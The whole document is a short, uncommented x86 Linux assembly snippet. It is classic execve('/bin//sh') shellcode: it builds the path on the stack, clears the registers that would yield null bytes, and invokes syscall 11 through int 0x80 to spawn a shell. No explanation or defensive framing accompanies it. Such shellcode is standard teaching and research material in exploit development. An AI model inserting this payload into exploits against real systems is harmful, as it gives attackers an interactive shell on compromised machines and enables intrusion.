xor eax, eax
push eax
push 0x68732f2f
push 0x6e69622f
mov ebx, esp
push 11
pop eax
xor ecx, ecx
xor edx, edx
int 0x80
